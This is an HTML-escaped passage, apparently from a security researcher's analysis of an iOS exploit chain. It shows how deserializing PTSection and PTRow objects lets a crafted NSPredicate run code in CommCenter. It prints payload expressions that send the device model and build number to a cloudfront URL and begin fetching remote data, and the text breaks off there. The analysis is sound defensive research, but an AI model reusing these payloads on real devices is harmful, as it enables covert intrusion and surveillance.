{&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; NSError err;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; [bundle loadAndReturnError:&amp;amp;err]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;So sending a serialized &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;object will cause &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;to load the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;/System/Library/AccessibilityBundles/AXSpeechImplementation.bundle&lt;/span&gt;&lt;span&gt;&amp;nbsp;library. With some scripting using otool -L to list dependencies we can &amp;nbsp;find the following dependency chain from &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AXSpeechImplementation.bundle&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PrototypeTools.framework&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[&amp;#39;/System/Library/AccessibilityBundles/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; AXSpeechImplementation.bundle/AXSpeechImplementation&amp;#39;,&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp;&amp;#39;/System/Library/AccessibilityBundles/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; AXSpeechImplementation.bundle/AXSpeechImplementation&amp;#39;,&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp;&amp;#39;/System/Library/PrivateFrameworks/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; AccessibilityUtilities.framework/AccessibilityUtilities&amp;#39;,&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp;&amp;#39;/System/Library/PrivateFrameworks/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; AccessibilitySharedSupport.framework/AccessibilitySharedSupport&amp;#39;,&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;#39;/System/Library/PrivateFrameworks/Sharing.framework/Sharing&amp;#39;,&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;#39;/System/Library/PrivateFrameworks/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; PrototypeTools.framework/PrototypeTools&amp;#39;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This explains how the deserialization of a &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;will succeed. But what&amp;#39;s so special about &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTSections&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRows&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;?&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.tsdrbvcjutdl"&gt;&lt;span&gt;Predicated Sections&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;[PTRow initwithcoder:]&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;contains the following snippet:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; self-&amp;gt;condition = [coder decodeObjectOfClass:NSPredicate&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;forKey:@&amp;quot;condition&amp;quot;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; [self-&amp;gt;condition allowEvaluation]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This will deserialize an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;object, assign it to the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;member variable &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;condition&lt;/span&gt;&lt;span&gt;&amp;nbsp;and call &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;allowEvaluation&lt;/span&gt;&lt;span&gt;. This is meant to indicate that the deserializing code considers this predicate safe, but there&amp;#39;s no attempt to perform any validation on the predicate contents here. They then need one more trick to find a path to which will additionally evaluate the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRow&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;#39;s condition predicate.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Here&amp;#39;s a snippet from &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[PTSection initWithCoder:]&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSSet* allowed = [NSSet setWithObjects: @[PTRow]]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;id* rows = [coder &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;decodeObjectOfClasses&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;:allowed forKey:@&amp;quot;rows&amp;quot;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[self initWithRows:rows]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This deserializes an array of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRows&lt;/span&gt;&lt;span&gt;&amp;nbsp;and passes them to &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[PTSection initWithRows]&lt;/span&gt;&lt;span&gt;&amp;nbsp;which assigns a copy of the array of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRows&lt;/span&gt;&lt;span&gt;&amp;nbsp;to&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;&amp;nbsp;PTSection-&amp;gt;rows&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[self &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;_reloadEnabledRows&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;]&lt;/span&gt;&lt;span&gt;&amp;nbsp;which in turn passes each row to &lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[self _shouldEnableRow:]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;_shouldEnableRow:row {&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; if (row-&amp;gt;condition) {&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; return [row-&amp;gt;condition evaluateWithObject: self-&amp;gt;settings]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;And thus, by sending a &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing a single &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;with an attached condition &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;they can cause the evaluation of an arbitrary &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;, effectively equivalent to arbitrary code execution in the context of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.9aaj7tmx81zt"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;Payload 2&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;attached to the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;uses a similar trick to the first payload to cause the evaluation of six independent &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;, but this time in the context of the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;process. &lt;/span&gt;&lt;span&gt;They&amp;#39;re presented here in pseudo Objective-C:&lt;/span&gt;&lt;/p&gt;&lt;h3 class="YDzVciBUld-c8" id="h.4c2mqlgknm1m"&gt;&lt;span class="YDzVciBUld-c10 YDzVciBUld-c3"&gt;Expression 1&lt;/span&gt;&lt;/h3&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[ &amp;nbsp;[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp;setObject:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;@[[NSURLComponents&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;componentsWithString:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;@&amp;quot;https://cloudfront.net/XXX/XXX/XXX?aaaa&amp;quot;], &amp;#39;0&amp;#39;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp;forKey: @&amp;quot;0&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The use of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a trick to enable the array of independent &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;to have &amp;quot;local variables&amp;quot;. In this first case they create an &lt;/span&gt;&lt;span class="YDzVciBUld-c0 YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsurlcomponents"&gt;NSURLComponents&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;object which is used to build parameterised URLs. This URL builder is then stored in the global dictionary returned by &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;span&gt;&amp;nbsp;under the key &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;0&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;quot;.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class="YDzVciBUld-c8" id="h.f96qjcb9lnky"&gt;&lt;span class="YDzVciBUld-c10 YDzVciBUld-c3"&gt;Expression 2&lt;/span&gt;&lt;/h3&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[[NSBundle&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; bundleWithPath:@&amp;quot;/System/Library/PrivateFrameworks/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;SlideshowKit.framework/Frameworks/OpusFoundation.framework&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp;] load]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This causes the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;OpusFoundation&lt;/span&gt;&lt;span&gt;&amp;nbsp;library to be loaded. The exact reason for this is unclear, though the dependency graph of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;OpusFoundation&lt;/span&gt;&lt;span&gt;&amp;nbsp;does include &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AuthKit&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is used by the next &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;span&gt;. It&amp;#39;s possible that this payload is generic and might also be expected to work when evaluated in processes where &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AuthKit&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t loaded.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="YDzVciBUld-c8" id="h.o9lhtiv01xpk"&gt;&lt;span class="YDzVciBUld-c3 YDzVciBUld-c10"&gt;Expression 3&lt;/span&gt;&lt;/h3&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[ [ [CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; objectForKey:@&amp;quot;0&amp;quot; ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; setQueryItems:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; [ [ [NSArray arrayWithObject: &lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;[NSURLQueryItem&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queryItemWithName: @&amp;quot;m&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value:[AKDevice _hardwareModel] ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;] arrayByAddingObject: &lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;[NSURLQueryItem&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queryItemWithName: @&amp;quot;v&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value:[AKDevice _buildNumber] ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;] arrayByAddingObject:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;[NSURLQueryItem&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queryItemWithName: @&amp;quot;u&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value:[NSString randomString]]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This grabs a reference to the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSURLComponents&lt;/span&gt;&lt;span&gt;&amp;nbsp;object stored under the &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;0&lt;/span&gt;&lt;span&gt;&amp;quot; key in the global &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;sharedAnonymizedStrings&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;dictionary then parameterizes the HTTP query string with three values:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[AKDevice _hardwareModel]&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a string like &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;iPhone12,3&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;quot; which determines the exact device model.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[AKDevice _buildNumber]&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a string like &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;18A8395&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;quot; which in combination with the device model allows determining the exact firmware image running on the device.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;[NSString randomString]&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a decimal string representation of a 32-bit random integer like &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;394681493&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;quot;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="YDzVciBUld-c8" id="h.ifxeb8zet13e"&gt;&lt;span class="YDzVciBUld-c10 YDzVciBUld-c3"&gt;Expression 4&lt;/span&gt;&lt;/h3&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[ [CaliCalendarAnonymizer sharedAnonymizedString]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; setObject:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; [NSPropertyListSerialization&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; propertyListWithData:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [[[NSData&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;dataWithContentsOfURL:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;[[[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 